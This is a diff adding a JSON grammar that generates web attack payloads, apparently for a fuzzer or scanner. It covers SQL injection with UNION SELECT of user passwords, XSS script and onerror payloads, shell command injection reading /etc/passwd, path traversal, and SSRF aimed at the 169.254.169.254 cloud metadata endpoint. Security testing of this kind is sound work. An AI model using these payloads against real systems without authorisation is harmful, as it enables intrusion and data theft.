@@ -1,0 +1,40 @@
+{
+  "sqli": {
+    "start": ["<boundary><operator><condition><comment>", "<boundary><union><comment>"],
+    "boundary": ["'", "1'", "' OR '", "\"", ""],
+    "operator": [" OR ", " AND ", " || "],
+    "condition": ["1=1", "'1'='1", "'a'='a", "2>1", "1=1#"],
+    "union": [
+      " UNION SELECT null, user()",
+      " UNION SELECT user, password FROM users",
+      " UNION SELECT 1, 2"
+    ],
+    "comment": ["-- ", "#", "/*", "/* */", ""]
+  },
+  "xss": {
+    "start": ["<prefix><tag><suffix>", "<event_handler>"],
+    "prefix": ["<script>", "\"><script>", "'><script>", "<img src=x onerror=", "\"><img src=x onerror="],
+    "tag": ["alert(1)", "alert('XSS')", "console.log(1)", "prompt(1)"],
+    "suffix": ["</script>", "</img>", ">", ""],
+    "event_handler": ["\" onfocus=\"alert(1)\" autofocus=\"", "' autofocus onfocus='alert(1)"]
+  },
+  "command_injection": {
+    "start": ["<separator><command>", "<boundary><separator><command><comment>"],
+    "boundary": ["127.0.0.1", "localhost", "8.8.8.8"],
+    "separator": ["; ", " && ", " || ", " | ", "`", "$("],
+    "command": ["whoami", "id", "cat /etc/passwd", "uname -a"],
+    "comment": ["", " #", " ;"]
+  },
+  "path_traversal": {
+    "start": ["<traversal><target_file>"],
+    "traversal": ["../../../../", "../../../", "..\\..\\..\\", "....//....//....//"],
+    "target_file": ["etc/passwd", "windows/win.ini", "etc/hosts"]
+  },
+  "ssrf": {
+    "start": ["<scheme><host><port><path>"],
+    "scheme": ["http://", "https://", "dict://", "gopher://"],
+    "host": ["127.0.0.1", "localhost", "169.254.169.254", "0.0.0.0"],
+    "port": [":80", ":8000", ":22", ""],
+    "path": ["/", "/latest/meta-data/", "/admin"]
+  }
+}
